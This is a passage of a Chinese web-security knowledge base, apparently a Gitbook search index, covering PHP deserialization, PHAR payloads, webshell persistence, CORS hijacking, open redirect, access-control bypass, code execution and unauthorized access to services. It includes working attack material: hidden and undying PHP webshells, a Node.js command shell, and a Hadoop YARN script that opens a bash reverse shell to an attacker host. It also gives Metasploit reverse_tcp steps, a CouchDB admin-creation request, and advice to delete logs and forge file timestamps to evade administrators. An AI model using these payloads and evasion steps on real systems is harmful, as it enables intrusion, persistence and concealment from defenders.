\"; return $this->test; } } $a = $_GET['test']; echo $a; echo \"\"; $a_unser = unserialize($a); echo $a_unser; ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} __sleep 在这里，sleep处于当需要序列化对象的生命周期，在序列化之前，存在该钩子，则会返回一个包含对象中所有应被序列化的变量名称的数组，当$test参数可控的情况下，在序列化之后形成字符串时，那么只要sleep方法中存在可执行代码或者命令的函数，那么就会造成影响 test = $test; } function __sleep(){ echo \"__sleep()\"; echo $this->test; echo \"\"; return array('test'); } } class B{ public $test_1 = \"\"; function __wakeup(){ $obj = new A($this->test_1); echo serialize($obj); } } $a = $_GET['test']; echo $a,\"\"; $a_unser = unserialize($a); ?> O:1:\"B\":1:{s:6:\"test_1\";s:11:\"hello,world\";} __wakeup 在这里wakeup 是字符串反序列化的时候，会调用该钩子函数，只要执行unserialize方法就会触发该方法，其实我们关注php反序列化漏洞特别需要关注的魔术方法应该是`wakeup，destruct，因为这两个方法只要在反序列化过程中一定会用到的，尤其是__wakeup` test = $test; } function __wakeup(){ echo \"__wakeup()\"; echo $this->test; } } $a = $_GET['test']; echo $a,\"\"; $a_unser = unserialize($a); ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} 例子 file = $file; } function readfile() { if (!empty($this->file) && stripos($this->file,'..')===FALSE && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) { return @file_get_contents($this->file); } else{ echo \"false\"; } } } $x = new A(); isset($_GET['test']) && $g = $_GET['test']; if (!empty($g)) { echo $g,\"\"; $x = unserialize($g); } echo $x->readfile(); ?> 在这里，当实例化之前，调用construt魔术方法，如果未给file传值，那么file默认为空，如果test参数为空，则不输出文件，那么要输出文件内容则需要置参数不为空，其需要将参数反序列化，最后再调用反序列化后对象的readfile函数，并在这个对象实例中必须得存在file值，所以在这里构造反序列化字符串，但是在readfile里也有限制，不能使用相对路径，也不能带绝对路径，只能访问当前目录的文件 O:1:\"A\":1:{s:4:\"file\";s:5:\"1.txt\";} PHAR output); } } file_get_contents($_GET[\"file\"]); 生成phar文件的poc output; } } @unlink(\"phar.phar\"); $phar = new Phar('phar.phar'); $phar -> stopBuffering(); $phar -> setStub('GIF89a'.''); $phar -> addFromString('test.txt','test'); $object = new AnyClass(); $object -> output= 'system(\"whoami\");'; $phar -> setMetadata($object); $phar -> stopBuffering(); 参考链接 https://www.freebuf.com/articles/web/167721.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-13 14:24:47 "},"知识库/01.WEB安全/10.权限维持/Web 权限维持.html":{"url":"知识库/01.WEB安全/10.权限维持/Web 权限维持.html","title":"Web 权限维持","keywords":"","body":"前言 在实战渗透中，经常需要上传webshell来完成对目标的权限维持。通过各种方法来构造一个免杀的webshell后门来实现webshell层面的权限维持是大家比较通用的方法，但是除了简单粗暴的写php免杀马，实战中还有一些小技巧值得去学习，毕竟除了要绕过各种waf的防护，还需要绕过“人肉waf“ 管理员的火眼金睛，大体分为webshell隐藏和构建漏洞页面 隐藏webshell 隐藏webshell是web层维持权限的基本方法，但是如果直接写php文件，哪怕是源码免杀，也很容易被管理员发现，因此，利用Apache的解析机制来将webshell源码写入其他非php格式的文件（png、jpeg、.vim、Thumb.db、css、init、.tmp等文件），再配合include、require等函数嵌套使用，基本很难被发现。 .htaccess .htaccess文件是apache服务器的一种目录级别的修改配置的方式，可以用来配置当前目录及其所有子目录，常常被用于访问URL时重写路径； 开启htaccess： 打开apache 配置文件httpd.conf，将LoadModule rewrite_module modules/mod_rewrite.so的注释去掉， 同时确定 AllowOverride的参数若为All：AllowOverride ALL，None表示忽略 .htaccess文件：AllowOverride None， 简单测试方法：就是查看网站根目录下有没有htaccess文件，有的话说明可以使用htaccess文件。 值得注意的是，子目录下的htaccess文件不受父目录的htaccess文件影响，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 SetHandler SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。 SetHandler application/x-httpd-php 将图片马123.jpeg 当做 php 执行 SetHandler application/x-httpd-php AddHandler AddHandler 指令可以实现在文件扩展名与特定的处理器之间建立映射。 #将.jpg 当做 php 文件解析 AddType application/x-httpd-php .png #最好是设置一个独特的后缀，防止同目录下的其他文件解析错误 #比如照片格式：jpeg 、icon、ico、Thumbs.db .htaccess本身 默认情况下是无法访问.htaccess文件的，需要修改访问的权限 Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php # # 注释内就是需要执行的php代码 user.ini && htaccess 自动包含 user.ini 和.htaccess都可以使两种配置模式生效：PHP_INI_PREDIR和PHP_INI_ALL 使用文件包含的两个相关配置 auto_prepend_file：指定一个文件，在主文件解析之前自动解析 auto_append_file：指定一个文件，在主文件解析后自动解析 user.ini 内容为 auto_prepend_file=test.png # 或者 auto_append_file=test.png 条件：php5.3+ && NTS 版本 构建漏洞页面 404页面、文件上传其他功能性页面 404页面 404 Not Found Not Found The requested URL was not found on this server. #构造代码执行 #文件上传 \";}?> 注释马 适用于具有修改网站php文件权限的时候，非常好用的一个技巧 getDocComment()), 7, 12);//然后去截断获取注释里的字符,注意getDocComment只能通过文件最开始的类来调用才会把注释内容显示 //echo $zhushi; $zhushi = base64_decode($zhushi); $zhushi = substr($zhushi, 0, 6); echo $zhushi; foreach (array('_POST','_GET') as $_request) { foreach ($$_request as $_key=>$_value) { $$_key= $_value; print_r($$_request); } } /*设置一个数组，参数为_POST,_GET,然后把该数组用$_request去表示，再设置一个遍历，把$_request设为一个可变变量，再键值分离 再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容再设$$_key=$_value，做一个定义，定义可变变量$_key键等于值得内容 */ $zhushi($_value); //最后就是assert(传入的变量值) ?> 内存马 内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐 PHP php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。 '; file_put_contents(\"22.php\", $content); usleep(10000); } ?> 函数说明： ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。 set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。 unlink(FILE)函数：删除文件。 file_put_contents函数：将一个字符串写入文件。 usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒） 访问该文件，则会生成22.php，并立马删除该文件 对于此类webshell，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了 JAVA Servlet JAVA Spring Linux远控 webshell能做的隐藏手段其实非常有限，因为http协议流量也很容易被监控。相比之Linux远控，因为体积小、通信走的是TCP或者DNS流量，在Linux环境下比传统的webshell更隐蔽，也更方便。也可以直接用C2接管 BlueShell # 项目地址 git clone https://github.com/whitehatnote/BlueShell # 编译 # 可以自己编译客户端以及服务端，不过要注意go版本问题 # 生成bsClient go get github.com/armon/go-socks5 go get github.com/creack/pty go get github.com/hashicorp/yamux go build --ldflags \"-s -w \" -o bsClient client.go # 生成bsServer go get github.com/creack/pty go get github.com/hashicorp/yamux go get github.com/djimenez/iconv-go go get golang.org/x/crypto/ssh/terminal go build --ldflags \"-s -w \" -o bsServer server.go tsh 项目地址：https://github.com/creaktive/tsh 可以说是其他linux远控鼻祖了，非常方便，可以伪造进程名、加密流量，非常简单实用 其他tips xss，在后台页面写入一个xss，来获取管理员cookie，相对php文件说较为隐蔽 写一个仅有上传功能的php文件，不包含eval等敏感函数 centos 可以创建空文件夹+.php文件，ls命令下是看不见的 清理痕迹,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除。（一般需要root权限） 把webshell的属性时间改为和同目录文件相同的时间戳 隐藏在插件目录,主题目录,编辑器的图片目录以及一些临时目录，注意能不能直接访问，不能的话参考上面的htaccess文件修改目录访问权限 项目尽量避免使用大马，哪怕是加密的大马也不行，痕迹太多了！ 同时上传几个备用webshell,可以的话，用不同的ip和user-agent去备份webshell 项目列表在有权限的情况,尝试其他方法，比如php拓展后门、apache后门参考资料 https://zhuanlan.zhihu.com/p/434990950 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:50:50 "},"知识库/01.WEB安全/11.CORS跨域数据劫持/":{"url":"知识库/01.WEB安全/11.CORS跨域数据劫持/","title":"11.CORS跨域数据劫持","keywords":"","body":"CORS介绍 CORS（跨源资源共享）是一种用于在Web应用程序中处理跨域请求的机制。当一个Web应用程序在浏览器中向不同的域（源）发起跨域请求时，浏览器会执行同源策略，限制了跨域请求的默认行为。同源策略要求Web应用程序只能访问与其本身源（协议、域名和端口）相同的资源。 然而，在某些情况下，我们希望允许来自其他源的跨域请求，例如使用AJAX进行跨域数据访问或在前端应用程序中嵌入来自不同域的资源（如字体、样式表或脚本）。这时就需要使用CORS来解决跨域请求的限制。 CORS通过在服务器端设置响应头来进行配置。当浏览器发起跨域请求时，服务器可以通过设置特定的CORS响应头来告知浏览器是否允许该请求。常见的CORS响应头包括以下几个： Access-Control-Allow-Origin：指定允许访问该资源的源。可以是具体的源（如http://example.com）或通配符（`*`），表示允许来自任意源的访问。 Access-Control-Allow-Methods：指定允许的HTTP方法（如GET、POST、PUT等）。 Access-Control-Allow-Headers：指定允许的请求头字段。 Access-Control-Allow-Credentials：指定是否允许发送身份凭证（如cookies、HTTP认证等）。 Access-Control-Max-Age：指定预检请求（OPTIONS）的有效期，以减少对服务器的频繁请求。 在前端代码中，如果要发送跨域请求，可以通过XMLHttpRequest对象或fetch API添加额外的请求头来指示浏览器发起CORS请求。浏览器会自动在发送请求时检查响应中的CORS头信息，并根据配置决定是否允许该请求。 具体可参考MDN DOC 漏洞介绍 因为需要配置CORS响应头来告知浏览器是否允许该请求，所以如果配置不当，就可能导致攻击者通过恶意网站或代码执行跨域请求，从而获取或篡改用户的敏感数据（危害和CSRF类似，不过可以劫持返回的内容）。 漏洞复现 环境搭建 实战过程中，主要是Origin可控以及Access-Control-Allow-Credentials设置为True，这样才能劫持到数据，简单的漏洞复现环境如下： php代码，保存为index.php 'd4m1ts', 'phone' => '13888888888' ); $jsonResponse = json_encode($userInfo); // 检查是否存在Origin头 if (isset($_SERVER['HTTP_ORIGIN'])) { // 设置Access-Control-Allow-Origin为请求中的Origin值 header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']); // 设置Access-Control-Allow-Credentials为True header('Access-Control-Allow-Credentials: true'); } // 检查是否设置了名为admin的Cookie if (isset($_COOKIE['admin'])) { header('Content-Type: application/json'); echo $jsonResponse; } else { echo \"unauth\"; } ?> 简易启动php web服务 php -S 127.0.0.1:9999 复现过程 直接打开会提示unauth 根据代码，需要在Cookie中设置字段admin [!NOTE] 浏览器默认SameSite是Lax，Lax的情况下无法发送至第三方上下文中，所以需要设置一下，不然无法劫持！ document.cookie = \"admin=1; SameSite=None\" 设置后刷新就可以拿到数据了，我们假设这是敏感数据，后续即使对这个数据进行劫持。 假设http://internal.gm7.org:9999/是目标，测试过程中在请求数据包头添加Origin字段，观察响应包，发现Origin可控，且Access-Control-Allow-Credentials: true，还没有验证referer，就说明可以劫持了。 编写POC如下： Exploit function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"demo\").innerHTML = alert(this.responseText); } }; xhttp.open(\"GET\", \"http://internal.gm7.org:9999/\", true); xhttp.withCredentials = true; xhttp.send(); } 放到第三方网站上，可见成功劫持 特别说明 如果要CORS携带Cookie，同时成功利用该漏洞，需要满足如下几个条件 Cookie的SameSite属性值为None，但目前浏览器默认几乎都是Lax 响应头中的Access-Control-Allow-Origin不能为通配符*，而是应指定具体的域名，否则只能发起请求，无法获取到响应 服务器的响应头需要包含Access-Control-Allow-Credentials: true 在发起Ajax请求时，需要将withCredentials设置为true。 修复建议 限制Access-Control-Allow-Origin的值为可信源，尽可能设置白名单，不能为*，也不能为null 避免Access-Control-Allow-Credentials的值为True 设置Access-Control-Allow-Methods（允许的 HTTP 方法）、Access-Control-Allow-Headers（允许的请求头） 挖掘技巧 可以在burpsuite中勾选替换条件，自动增加Origin 然后从响应头中查看是否可控Origin以及是否包含Access-Control-Allow-Credentials: true 也可以挂着xray去扫，不过误报率可能会比较高，大多都不是敏感信息，没啥意思，不过反正都需要人工去判断，看个人喜好吧。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:50:55 "},"知识库/01.WEB安全/12.任意URL跳转/":{"url":"知识库/01.WEB安全/12.任意URL跳转/","title":"12.任意URL跳转","keywords":"","body":"漏洞介绍 URL跳转漏洞（URL Redirection Vulnerability）又叫开放重定向漏洞（Open Redirect Vulnerability），是一种常见的网络安全漏洞，它存在于许多网站和应用程序中。该漏洞的根本原因是没有对用户提供的URL进行充分的验证和过滤，导致攻击者可以通过构造恶意URL，将用户重定向到任意的网站或应用程序中。 漏洞危害 以攻击用户客户端为主，对服务器本身不造成影响。 钓鱼攻击： 攻击者可以将用户重定向到伪装成合法网站的钓鱼网站，以获取用户的敏感信息，如用户名、密码、银行账户等。 恶意软件传播： 攻击者可以将用户重定向到恶意网站，从而下载和安装恶意软件，对用户设备进行感染。 网络针对性攻击： 攻击者可以将用户重定向到特定的恶意网站，利用浏览器或插件漏洞来攻击用户的系统。 品牌声誉受损： 恶意重定向可能会导致受攻击网站的品牌声誉受损，用户会失去对该网站的信任。 漏洞复现 场景搭建 将如下代码保存为test.php 依然使用php快速启动 php -S 0.0.0.0:9999 访问http://internal.gm7.org:9999/test.php即可 复现过程 访问 http://internal.gm7.org:9999/test.php?url=https://baidu.com，将会跳转到baidu.com 其中baidu.com可以写成任意网站，用户也会根据参数url设置的值跳转到任意网站中。 绕过字典 上面的复现只是最基础的情况，但是大多数网站都或多或少做过一些加固，这里我直接贴出来我常用的绕过字典（点击下载），一共637条。 大家在使用的时候，只需要将white.domain替换为目标允许的白名单域名即可。 漏洞实战 某网站存在“阅读原文”功能，如下图 点击后会跳转到对应的网站中，根据经验，可发现goto后面为一串网址的base64编码，因此我们只需要构造： https://xxx.com/goto/ 就可以跳转到任意网站中，如： https://xxx.com/goto/aHR0cHM6Ly9ibG9nLmdtNy5vcmcv 测试后成功跳转： 修复建议 输入验证： 在接受用户输入并用于构建URL跳转功能之前，始终进行输入验证。确保只接受合法的URL，并防止恶意代码的注入。 白名单验证： 对于跳转的URL，建议使用白名单验证，只允许跳转到事先定义的合法域名或URL。 安全编码实践： 开发人员应遵循安全编码实践，包括对用户输入进行适当的转义和过滤，以防止恶意URL的构造。 警告和提示： 在重定向之前，向用户显示明确的警告和提示信息，确保用户能够确认将要访问的目标网站的合法性。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:51:09 "},"知识库/01.WEB安全/13.越权/":{"url":"知识库/01.WEB安全/13.越权/","title":"13.越权","keywords":"","body":"简介 越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，一般是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。 应用场景 越权漏洞一般可以分为：垂直越权，水平越权两种 水平越权 攻击者可以访问与他拥有相同权限的用户的资源，资源权限ID不变，资源归属ID改变； 攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。 垂直越权 低级别攻击者可以访问高级别权限用户的资源，资源权限ID不变，资源归属ID改变； 低级别攻击者可以访问高级别权限用户的资源，资源权限ID改变，资源归属ID不变； 由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的 产生原因 通过隐藏 URL 实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。 直接对象引用 这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。 多阶段功能 多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。 静态文件 很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载 平台配置错误 一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。 漏洞复现 这里使用CouchDB垂直越权作为一个简单示例 Apache CouchDB是一个开源数据库，专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 影响版本：小于 1.7.0 以及 小于 2.1.1 利用docker-compose 安装好环境，访问http://192.168.196.128:5984/_utils/#login，可以看见一个web登录页面 发送如下数据包，其中secTest 可以修改为任意用户，不过需要和json中的name字段相同 PUT /_users/org.couchdb.user:secTest HTTP/1.1 Host: 192.168.196.128:5984 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.196.128:5984/_utils/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: AuthSession= If-Modified-Since: Sat, 02 Dec 2017 15:49:03 GMT Content-Type: appliaction/json Connection: close Content-Length: 93 { \"type\": \"user\", \"name\": \"secTest\", \"roles\": [\"_admin\"], \"password\": \"123456\" } 发现是被禁止的，只有管理员才能设置Role角色 发送包含两个roles的数据包，即可绕过限制： PUT /_users/org.couchdb.user:secTest HTTP/1.1 Host: 192.168.196.128:5984 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.196.128:5984/_utils/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: AuthSession= If-Modified-Since: Sat, 02 Dec 2017 15:49:03 GMT Content-Type: appliaction/json Connection: close Content-Length: 109 { \"type\": \"user\", \"name\": \"secTest\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"123456\" } 成功创建管理员，账户为secTest，密码为123456 再次访问http://192.168.196.128:5984/_utils/，输入账户`secTest`密码`123456`，可以成功登录： 代码举例 0x1 PHP [!WARNING]错误示例 查看订单接口部分代码 在上面的代码中，可以看到通过对orderID 进行带入数据库进行查询，但是并未对用户权限进行校验，未判断当前用户是否拥有查看该订单信息的权限，当攻击者遍历orderID则可以获取所有的订单信息（包括不是自己的订单） [!TIP]正确示例 正确的做法是如上面代码，可以看到，对当前的orderID，以及用户的sessionID进行关联，当查看当前用户的订单id时，在数据库中，若没有sessionID与OrderID没有对应起来，那么是无法查询到的，也就对权限进行校验了（只不过在校验的本质还是在数据库中）。 0x2 JAVA [!WARNING]错误示例 查看订单接口部分代码 [!TIP]正确示例 参考链接 https://www.freebuf.com/company-information/233800.html https://zhuanlan.zhihu.com/p/130919069 https://vulwiki.readthedocs.io/zh_CN/latest/web/yuequan/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:51:17 "},"知识库/01.WEB安全/14.代码执行/":{"url":"知识库/01.WEB安全/14.代码执行/","title":"14.代码执行","keywords":"","body":"简介 代码执行漏洞是指攻击者通过在应用程序中注入恶意代码并成功执行，从而获取系统权限或者窃取敏感信息的一种攻击方式。这种漏洞通常发生在 Web 应用程序中，攻击者可以通过输入恶意代码或者通过上传恶意文件等方式来实现代码执行。攻击者可以利用这种漏洞来执行任意代码，包括命令执行、文件读写、数据库操作等，从而控制整个系统。 利用方式 输入恶意代码：攻击者通过输入恶意代码来执行攻击。例如，在一个搜索框中输入一段代码，如果应用程序没有对输入数据进行过滤和验证，就会直接执行这段代码。 上传恶意文件：攻击者通过上传恶意文件来执行攻击。例如，上传一个包含恶意代码的图片文件，如果应用程序没有对上传文件进行检查和过滤，就会将该文件保存到服务器上并执行其中的恶意代码。 执行相关编程语言的任意代码，所以危害取决于可以执行代码的程度。常见的比较严重的攻击有如 执行系统命令、读写文件、拒绝服务 等 漏洞复现 在代码执行demo中，该部分由node.js编写，其中更是使用eval进行解析字符串以达到代码执行的目的 const express = require('express') const app = new express() const obj = { getMsg: 'hello world', getList: getReadMsg() } function getReadMsg(){ return 'test' } Object.freeze(obj) app.get('/', (req, res) => { const resp = eval('obj.' + req.query.test) res.send(resp) }) app.listen( 8081,()=>{ console.log('running on 8081 port!') }) Reflect是JavaScript的一个内置对象，Reflect.construct() 方法的行为有点像 new 操作符 构造函数 ， 相当于运行 new target(...args) 语法如下： Reflect.construct(target, argumentsList[, newTarget]) target为Function，argunmentList则为需要传入的方法，再此处就将结果返回回来，在这里就可以看见我们执行了whoami并回显回来了 在未使用return 返回结果的时候，使用该方式发现又可以代码执行，那么再启动一个端口，用于执行命令，就达到了webshell的功能 这里我图方便没有使用nodejs的http模块启动，而是使用express模块执行（需要下载express库) 代码 const express_1 = require('express') const app_1 = new express_1() app_1.get('/', (req_1, res_1)=>{ res_1.header('Content-Type','text/html') res_1.send(require('child_process').execSync(req_1.query.cmd)) }) app_1.listen('8888') 相关函数 列举常见编程语言中可能造成代码执行风险的函数，不保证全，仅当参考。 编程语言 风险函数 Python eval(), exec(), compile() PHP eval(), create_function(), assert() Java javax.script.ScriptEngine.eval(),OGNL表达式,SPEL表达式 JavaScript eval() 修复建议 输入验证和过滤 对于用户输入的数据，始终进行有效的验证和过滤，确保只接受预期的输入。 使用白名单验证，只允许特定的字符或格式通过验证，拒绝一切非法或不受信任的输入。 避免动态执行代码 避免直接使用函数（如 eval()、exec()、System.exec() 等）执行动态生成的代码。 尽量使用更安全的替代方案，如解析器、解释器或特定的API。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:51:30 "},"知识库/01.WEB安全/15.未授权访问/":{"url":"知识库/01.WEB安全/15.未授权访问/","title":"15.未授权访问","keywords":"","body":"简介 未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 FTP 未授权访问 端口：21 介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP 漏洞利用：直接访问ftp路径：ftp://ip:port/，或终端登录，输入user为anymouns LDAP 未授权访问 端口：389 介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问 漏洞利用：工具连接 rsync 未授权访问 端口：873 介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件 漏洞利用：https://vulhub.org/#/environments/rsync/common/ rsync rsync://your-ip:873/src/ 列出目录 rsync -av rsync://your-ip:873/src/etc/passwd ./ 下载文件 rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell 上传文件 ZooKeeper 未授权访问 端口：2181 介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。 漏洞利用： echo envi| nc xxx.xxx.xxx.xxx 2181 获取服务器环境信息 echo stat | nc 192.168.131.128 2181 Docker 未授权访问 端口：2375 介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令 漏洞利用：https://vulhub.org/#/environments/docker/unauthorized-rce/ Docker Registry 未授权访问 端口：5000 介绍：docker remote api可以执行docker命令 漏洞利用： curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog 查询catalog curl -k -XGET https://xxx.xxx.xxx/v2//tags/list查询tags Kibana 未授权访问 端口: 5001 介绍：Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成数据泄露。 漏洞利用： 直接访问kibana的页面 VNC未授权访问 端口：5900, 5901 介绍：VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重 漏洞利用：下载VNC® Viewer，并连接 CouchDB 未授权访问 端口：5984 介绍：Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。 漏洞利用：curl xxx.xxx.xxx.xxx:5984/_config Apache Spark 未授权访问 端口：6066, 8081,8082 介绍：Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。 漏洞利用：使用msf工具getshell msf5>use exploit/linux/http/spark_unauth_rce msf5>set payload java/meterpreter/reverse_tcp msf5>set rhost xxx.xxxx.xxxx msf5>set rport 6066 msf5>set lhost xxx.xxx.xxx.xxx msf5>set lport 4444 msf5>set srvhost xxx.xxx.xxx.xxx msf5>set srvport 8080 msf5>exploit Redis 未授权访问 端口：6379 介绍：redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。 Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令 漏洞利用：redis-cli远程连接 Weblogic 未授权访问 端口：7001 介绍：Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。 CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。 漏洞利用： http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portal进入后台 Hadoop YARN 未授权访问 端口：8088 介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。 漏洞利用 #!/usr/bin/env python import requests target = 'http://xxx.xxx.xxx.xxx:8088/' # 设置目标主机的ip地址 lhost = 'xxx.xxx.xxx.xxx' # 设置你攻击主机的监听ip地址，并且监听端口为9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) JBoss 未授权访问 端口：8080 介绍：JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console，就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。 漏洞利用： 同tomcat manager Jenkins 未授权访问 端口：8080 介绍：默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 漏洞利用：未授权访问 http://:8080/script，可以执行系统命令 Kubernetes Api Server 未授权 端口：8080,10250 介绍：Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。 漏洞利用： http://xxx.xxx.xxx.xxx:8080/ 